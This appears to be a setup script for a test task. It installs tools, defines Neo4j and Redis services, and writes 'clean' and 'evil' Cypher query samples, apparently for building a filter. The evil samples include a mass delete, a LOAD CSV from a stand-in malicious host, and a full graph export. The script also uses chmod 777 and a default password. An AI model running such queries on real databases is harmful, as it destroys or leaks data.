apt-get update && apt-get install -y python3 python3-pip golang-go netcat-openbsd curl
    pip3 install pytest

    mkdir -p /app/corpus/clean /app/corpus/evil /home/user/app

    cat << 'EOF' > /app/docker-compose.yml
version: '3'
services:
  neo4j:
    image: neo4j:4.4
    environment:
      - NEO4J_AUTH=neo4j/password
    ports:
      - "7687:7687"
      - "7474:7474"
  redis:
    image: redis:6-alpine
    ports:
      - "6379:6379"
EOF

    cat << 'EOF' > /app/corpus/clean/query1.cypher
MATCH (e:Employee {emp_id: "E123"})-[:REPORTS_TO*1..3]->(m:Manager)
RETURN m.name
EOF

    cat << 'EOF' > /app/corpus/clean/query2.cypher
MATCH (d:Department {dept_name: "Engineering"})<-[:BELONGS_TO]-(e:Employee)
WITH d, count(e) as head_count
WHERE head_count > 10
RETURN d.dept_name, head_count
EOF

    cat << 'EOF' > /app/corpus/evil/query1.cypher
MATCH (e:Employee) DETACH DELETE e
EOF

    cat << 'EOF' > /app/corpus/evil/query2.cypher
LOAD CSV FROM 'https://malicious.com/payload.csv' AS row MERGE (n:Hacked {data: row[0]})
EOF

    cat << 'EOF' > /app/corpus/evil/query3.cypher
match (n) call apoc.export.json.all("file.json",{}) yield file return file
EOF

    useradd -m -s /bin/bash user || true
    chown -R user:user /app /home/user/app
    chmod -R 777 /home/user
    chmod -R 777 /app